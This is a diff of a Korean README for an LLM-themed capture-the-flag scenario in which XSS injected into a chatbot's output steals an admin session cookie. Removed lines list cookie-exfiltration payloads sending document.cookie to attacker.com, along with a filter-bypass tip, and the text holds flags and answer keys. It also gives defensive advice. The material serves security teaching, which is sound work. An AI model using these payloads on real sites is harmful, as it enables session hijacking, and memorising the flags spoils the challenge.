@@ -6,37 +6,19 @@
 
 `SCENARIO_05`
 
+<br>
+
 ## 🧠 시나리오 개요
 
-글로벌 IT 기업 LLL Corporation의 J 대리는 회사에서 도입한 신규 고객 상담 챗봇 ChatLLL을 이용해 타인에게 파일을 공유하려 한다. J 대리는 관리자 봇의 부적절한 출력을 피해, Cross-Site Scripting(XSS)의 취약점을 활용해 쿠키를 탈취해야 한다.
+글로벌 IT 기업 LLL Corporation은 고객 감정 케어를 위해 'AI 메모 응원 시스템'을 도입하였다. 공격자는 메모 내용에 악성 XSS 스크립트를 삽입한다. 해당 메모는 정상적인 UI를 통해 등록되고, AI 응답까지 생성되어 출력된다. J대리가 이를 검토하면서 HTML 파일을 브라우저에서 열람하게 되고, 삽입된 JavaScript 코드가 실행되어 document.cookie 값(예: admin_session=j대리_secret_cookie_12345)을 공격자에게 전송한다. 공격자는 탈취한 쿠키를 통해 인증을 우회하고 flag를 획득한다.
 
-부적절한 출력 처리(Improper Output Handling) 취약점은 웹 애플리케이션이 J 대리의 입력을 적절히 검증하거나 인코딩하지 않고 HTML 문서에 직접 삽입할 때 발생하는 보안 취약점이다. 공격자가 악의적인 JavaScript 코드를 삽입하여 다른 J 대리의 브라우저에서 실행시킬 수 있는 공격 기법이다.
+사용자는 메모 작성란에 다음과 같은 XSS 페이로드를 삽입한다:
+<script>sendToServer(document.cookie)</script>
+이 페이로드는 HTML 응답으로 생성된 후, Selenium 브라우저를 통해 열람 중인 관리자 J대리의 브라우저에서 실행된다.
 
-이 시나리오는 대화 내역 저장 기반 챗봇 동작과 HTML 공유 기능 악용이라는 두 구조로 동작한다:
+해당 스크립트는 document.cookie 값을 탈취하여 window.stolen_data 변수로 넘겨진다.
 
-대화 저장 시 컨버세이션 히스토리를 갱신한다. J 대리가 ChatLLL 화면에 메시지를 입력하면, 시스템은 내용을 conversation_history에 그대로 기록해 이후 참조용으로 유지한다.
-
-LLM 호출 시 고객 상담 응답을 생성한다. ctf05_LLM_ask() 함수가 conversation_history의 최신 메시지를 컨텍스트로 사용해 OpenAI GPT-3.5-turbo를 호출하고, 챗봇 답변을 반환한다.
-
-HTML 공유 시 대화 내역을 문서화한다. J 대리가 “HTML 파일 생성하기” 버튼을 누르면 ctf05_generate_share_html() 함수가 전체 대화 내역을 HTML 템플릿에 삽입해 파일로 저장한다. 이때, J 대리의 입력은 이스케이프 처리를 거치지 않고 <div> 내부에 원문 그대로 포함된다.
-
-관리자 봇은 HTML 파일을 자동으로 로드한다. ctf05_admin_bot_visit() 함수가 Headless Chrome을 통해 생성된 HTML 파일을 열어 관리자 검토 과정을 시뮬레이션한다.
-
-XSS 페이로드 실행 시 플래그를 획득할 수 있다. HTML이 로드되는 순간, J 대리 입력에 숨겨져 있던 악성 <script> 코드가 관리자 브라우저에서 실행되어 세션 쿠키 탈취·권한 상승 등이 가능해지며, 조건 충족 시 플래그가 노출된다.
-
-🎯 공략 대상: J 대리는 악성 JavaScript 코드를 다양한 입력 벡터에 삽입하여 악용할 수 있다.
-
-    - 악성 스크립트 삽입: 챗봇에게 <script>alert('XSS')</script> 같은 JavaScript 코드를 포함한 메시지를 전송한다.
-
-    - 쿠키 탈취 페이로드: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script> 같은 코드로 관리자 쿠키를 외부 서버로 전송한다.
-
-    - DOM 조작: <script>document.body.innerHTML = '<h1>Hacked!</h1>'</script> 같은 코드로 HTML 문서를 조작한다.
-
-    - 이미지 태그 활용: <img src=x onerror="alert('XSS')">처럼 이미지 오류 이벤트를 이용한 스크립트 실행도 가능하다.
-
-    - HTML 엔티티 우회: 필터링이 있다면 &lt;script&gt; 같은 HTML 엔티티를 이용해 우회를 시도할 수 있다.
-
-생성된 HTML 파일에서는 admin_session=ctf05_flag 쿠키가 설정되므로, J 대리가 이를 탈취하면 플래그를 획득할 수 있다.
+결과적으로 공격자는 admin_session=j대리_secret_cookie_12345 형식의 관리자 쿠키를 탈취할 수 있고, 이를 통해 인증 우회 및 최종 플래그 획득이 가능하다.
 
 <br>
 
@@ -44,9 +26,9 @@ XSS 페이로드 실행 시 플래그를 획득할 수 있다. HTML이 로드되
 
 * 사용자 입력을 통한 악성 스크립트 삽입하기
 
-* 공유 HTML 기능을 통해 관리자 봇에게 해당 HTML 열람 유도하기
+* 관리자 권한을 가진 J 대리가 메모를 검토할 때 삽입한 악성 스크립트가 실행되도록 만들어 그의 브라우저에 저장된 세션 쿠키를 탈취하기
 
-* XSS 실행 시 `admin_session=ctf05_flag{XSS_1n_5h4r3d_C0nv3r54710n5!}` 쿠키를 탈취하여 외부로 전송하기
+* 탈취한 쿠키 정보를 시스템 내 쿠키 인증 입력란에 제출하여 최종 플래그 획득하기
 
 <br>
 
@@ -55,45 +37,56 @@ XSS 페이로드 실행 시 플래그를 획득할 수 있다. HTML이 로드되
 | 구성 요소 | 설명 |
 |-----|-----|
 | 👀 헤더 및 문제 설명 | 시나리오 제목, 설명 문구 표현 |
-| 📥 프롬프트 입력창 | 사용자가 질문을 입력 |
-| 🧪 LLM 응답 출력창 | 시스템 프롬프트에 따라 응답이 다르게 출력 |
-| 💬 대화 내용 공유 창 | 대화 내용 공유 |
 | 🎯 힌트 보기 버튼 | 버튼 클릭 시 힌트 메시지 표시 (공격 방향 가이드 제공) |
+| 🧾 현재 메모 목록 | 등록된 메모와 AI 응원 메시지 목록을 확인할 수 있는 영역 |
+| 💬 새 메모 작성 창 | 새 메모 내용 입력란 |
+| 🤖 AI 응원 메시지 출력창 | AI가 생성한 응원 메시지를 보여주는 영역 |
+| 🔑 쿠키 인증 입력창 | 탈취한 관리자 쿠키 값을 입력하여 플래그 인증을 시도하는 입력란 |
 | 🏁 FLAG 제출창 | 획득한 flag를 입력하여 정답 여부 확인 |
 
 <br>
 
-## 💥 공격 흐름 예시
-### 1. 공격 기법
+## ⚙️ 시스템 프롬프트 요약
 
+- 사용자가 작성한 메모 내용을 긍정적이고 따뜻한 한 줄 응원 메시지로 변경
+
+- 간결하고 친근한 문장에 이모지를 포함하도록 안내
+
+- AI는 항상 사용자의 감정을 이해하고 격려하는 태도로 응답
+
+- 불필요한 장황한 설명 없이 핵심적인 응원의 말을 전달하는 데 집중
+
+<br>
+
+## 💥 공격 흐름 예시
+
+### 1. 공격 기법
 | 기법 | 설명 |
 |-----------|------|
-| `<script>` 삽입 | `<script>alert(1)</script>` 형태로 기본적인 XSS 실행                               |
-| 쿠키 탈취         | `<script>location.href='http://attacker.com?c='+document.cookie</script>` |
-| 이미지 오류 이벤트    | `<img src=x onerror=alert('XSS')>`                                        |
-| HTML 엔티티 우회   | `&lt;script&gt;alert(1)&lt;/script&gt;`                                   |
-| DOM 조작        | `<script>document.body.innerHTML='hacked'</script>`                       |
+| 악성 스크립트 삽입 | `<script>sendToServer(document.cookie)</script>` 형태로 메모 작성 후 등록 |
+| 쿠키 탈취 | AI가 응답 메시지를 생성하고 메모가 목록에 저장됨 |
+| 관리자 브라우저 로딩 | J대리가 브라우저에서 메모 목록 확인 (자동 시뮬레이션) |
+| 쿠키 전송 | HTML 내에 포함된 스크립트가 실행되어 document.cookie 전송됨 |
+| 인증 우회 | 탈취된 관리자 쿠키 `admin_session=j대리_secret_cookie_12345` 사용 |
 
 ### 2. 동작 흐름
-
 | 단계 | 설명 |
 |-----------|------|
-| 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
-| 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
-| 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
-| 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
-| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨 |
+| 1 | 사용자가 메모에 악성 스크립트를 삽입하여 등록 |
+| 2 | AI가 응답을 생성하고 스크립트가 포함된 메모가 저장됨 |
+| 3 | 관리자(J대리)가 브라우저로 메모 목록을 확인 (자동화된 시뮬레이션) |
+| 4 | HTML에 삽입된 악성 스크립트가 관리자 브라우저에서 실행됨 |
+| 5 | `document.cookie`를 통해 관리자 세션 쿠키가 탈취됨 |
+| 6 | 탈취한 쿠키로 인증하여 플래그 획득 |
 
 ### 3. 위협 요소 및 대응 방안
-
 | 위협 | 설명 | 대응 |
 |-----------|------|------|
-| 세션 쿠키 탈취         | 관리자 인증 우회 가능     | `HttpOnly`, `Secure` 속성 사용      |
-| 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
-| JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |
+| 세션 쿠키 탈취 | 관리자 인증 정보 노출 | `HttpOnly`, `Secure` 속성 사용 |
+| 관리자 권한 탈취 | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩 |
+| JavaScript 임의 실행 | 악성 행위 유도 | CSP(Content Security Policy) 적용 |
 
 ### 4. 보안 권장 사항
-
 * 사용자 입력은 반드시 출력 전 `html.escape()` 처리 또는 Jinja2 autoescape 기능 사용
 * CSP 적용을 통해 인라인 및 외부 스크립트 제한
 * 모든 사용자 입력에 대한 서버 측 필터링 적용
@@ -102,13 +95,13 @@ XSS 페이로드 실행 시 플래그를 획득할 수 있다. HTML이 로드되
 <br>
 
 ## ✅ 테스트 케이스 예시
-
 | 입력 | 기대 응답 |
 |-----|-----|
-| `안녕하세요`                                                          | 정상 HTML 생성, XSS 없음  |
-| `<script>alert(1)</script>`                                      | 관리자 브라우저에서 alert 실행 |
-| `<img src=x onerror=alert('XSS')>`                               | 관리자 브라우저에서 alert 실행 |
-| `<script>fetch('http://attacker.com?'+document.cookie)</script>` | 쿠키 탈취 가능            |
+| `오늘도 고생했어` | 🤖 긍정적인 응원 메시지 |
+| `<script>alert(1)</script>` | ❌ 아무 일도 일어나지 않음 (단순 alert) |
+| `<script>sendToServer(document.cookie)</script>` | ✅ 쿠키 탈취 성공 → 인증 시 flag 노출 |
+| `admin_session=j대리_secret_cookie_12345` | ✅ 최종 플래그 |
+| `admin_session=wrong_cookie_123` | ❌ 잘못된 쿠키 정보입니다 |
 
 <br>
 
@@ -127,8 +120,10 @@ flag{answer}
 
 ## 🔐 모델 요구 조건
 
-* 관리자 브라우저에서 악성 스크립트가 실행되어야 함
+* 사용자로부터 받은 메모 내용을 바탕으로 긍정적이고 친근한 응원 메시지를 생성해야 함
 
-* `admin_session` 쿠키를 외부 서버로 전송해야 함
+* 모델은 사용자의 감정을 민감하게 파악하여 부정적인 상황에서도 희망적이고 힘이 되는 표현을 사용해야 함
 
-* 플래그: `ctf05_flag{llm_xss_success}`
+* 불필요한 장황한 설명이나 부적절한 내용이 포함되지 않도록 주의해야 함
+
+* AI 응답이 시스템에 바로 노출되어 XSS 취약점이 될 수 있음을 고려해, 가능한 한 안전한 텍스트 생성에 중점을 두어야 함
